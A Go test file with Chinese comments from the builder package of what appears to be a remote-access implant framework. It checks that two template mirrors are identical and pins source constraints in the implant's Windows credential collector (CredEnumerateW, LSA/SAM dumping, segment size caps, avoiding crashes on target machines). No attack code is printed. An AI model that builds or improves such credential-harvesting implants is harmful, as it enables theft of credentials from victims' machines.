package builder

import (
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// ─── 植入端镜像与"凭据链路"源码守卫 ──────────────────────────────────────
//
// 两件事：
//  1. internal/server/builder/implant 与 release/implant 是**同一份模板的两份镜像**，
//     必须逐文件 SHA-256 一致（历史上漏同步过：改了 builder 里的模板，发布包还是旧的）；
//  2. "凭据不卡死"的三处关键约束（重活并发闸 / 带超时排空 / 每段 64 KiB）写死在源码里，
//     用源码级守卫钉住，防止后续重构把闸门删掉或把 wait 改回无上限。

// TestImplantMirrorParity 两份模板镜像逐文件一致，且都是 62 个 .go 文件。
func TestImplantMirrorParity(t *testing.T) {
	const wantFiles = 62
	primary := "implant"
	mirror := filepath.Join("..", "..", "..", "release", "implant")

	sums := func(dir string) map[string]string {
		t.Helper()
		entries, err := os.ReadDir(dir)
		if err != nil {
			t.Fatalf("读取模板目录 %q 失败：%v", dir, err)
		}
		out := make(map[string]string, len(entries))
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(e.Name(), ".go") {
				continue
			}
			body, err := os.ReadFile(filepath.Join(dir, e.Name()))
			if err != nil {
				t.Fatalf("读取 %s 失败：%v", filepath.Join(dir, e.Name()), err)
			}
			sum := sha256.Sum256(body)
			out[e.Name()] = hex.EncodeToString(sum[:])
		}
		return out
	}

	a := sums(primary)
	b := sums(mirror)
	if len(a) != wantFiles {
		t.Fatalf("%s 下 .go 文件数 = %d, want %d", primary, len(a), wantFiles)
	}
	if len(b) != len(a) {
		t.Fatalf("%s 下 .go 文件数 = %d, %s = %d（镜像缺文件）", mirror, len(b), primary, len(a))
	}
	for name, hash := range a {
		other, ok := b[name]
		if !ok {
			t.Errorf("镜像缺少文件：%s", name)
			continue
		}
		if other != hash {
			t.Errorf("%s 两份镜像不一致：%s=%s %s=%s", name, primary, hash[:12], mirror, other[:12])
		}
	}
}

// TestImplantCredentialChainGuards 源码级守卫：凭据链路的四道约束必须存在。
func TestImplantCredentialChainGuards(t *testing.T) {
	read := func(name string) string {
		t.Helper()
		body, err := os.ReadFile(filepath.Join("implant", name))
		if err != nil {
			t.Fatalf("读取 %s 失败：%v", name, err)
		}
		return string(body)
	}

	mainSrc := read("main.go")
	for _, needle := range []string{
		"heavyMaxConcurrent = 2",             // 重活并发闸上限（默认 2）
		"heavyWaitTimeout = 5 * time.Second", // heavyWg 等待上限 5s
		"waitHeavyTasks(heavyWaitTimeout)",   // 带超时排空（不再是裸的 heavyWg.Wait()）
		"func waitHeavyTasks(",               // 带超时的等待实现存在
		`json:"duration_ms,omitempty"`,       // 结果带 duration_ms
		`json:"queued_ms,omitempty"`,         // 排队时长可观测
		"已放弃等待，后台可能仍在执行",                     // 超时文案
		"acquireHeavySlot()",                 // 信号量获取点
		"queued.Milliseconds()",              // 排队时长传入结果
	} {
		if !strings.Contains(mainSrc, needle) {
			t.Errorf("main.go 缺少凭据/重活链路约束：%q", needle)
		}
	}
	// 反向守卫：不允许再出现无上限的裸 heavyWg.Wait()（只能在 waitHeavyTasks 内部出现一次；
	// 注释里提到旧实现不算调用点，因此按"缩进两个 tab 的调用行"计数）。
	if n := strings.Count(mainSrc, "\n\t\theavyWg.Wait()"); n != 1 {
		t.Errorf("main.go 里重活排空调用点 %d 个，want 1（只允许在 waitHeavyTasks 内且必须带超时）", n)
	}

	credSrc := read("credentials_windows.go")
	for _, needle := range []string{
		"credentialsSegmentMaxBytes = 64 << 10", // 单段 64 KiB 上限
		"func credentialsSegment(",              // 分段结构构造
		`"truncated"`,                           // 段级 truncated 标注
		`"returned"`,                            // 实际返回条数
		`"omitted"`,                             // 因上限丢弃条数
		"需要管理员权限",                               // LSA/SAM 无权限时的明确文案
		"needs_admin",                           // 非管理员标记
		"duration_ms",                           // 凭据收集耗时
		"capCredentialEntries(",                 // 段内按条截断（不切断 JSON 条目）
	} {
		if !strings.Contains(credSrc, needle) {
			t.Errorf("credentials_windows.go 缺少分段/权限约束：%q", needle)
		}
	}
	// 旧缺陷守卫：不允许再把提示文本拼在 JSON 之后（前端 JSON.parse 会直接失败）。
	if strings.Contains(credSrc, `return string(jsonData) + privNote`) {
		t.Error("credentials_windows.go 又把提示文本拼在 JSON 后面了（前端 JSON.parse 会失败）")
	}
	// 旧缺陷守卫：CredEnumerateW 返回的是"指针数组"，必须解引用槽位里的指针。
	// 把槽位地址直接当 CREDENTIAL_W 用会读到垃圾指针，目标机上有任意凭据时整进程崩溃。
	if strings.Contains(credSrc, "unsafe.Sizeof(&CREDENTIAL_W{})") {
		t.Error("credentials_windows.go 又把指针槽位地址当成 CREDENTIAL_W 了（会 access violation 崩掉植入进程）")
	}
	if !strings.Contains(credSrc, "(*uintptr)(unsafe.Pointer(credsPtr + uintptr(i)*ptrSize))") {
		t.Error("credentials_windows.go 缺少 CredEnumerateW 指针数组的正确解引用")
	}
}
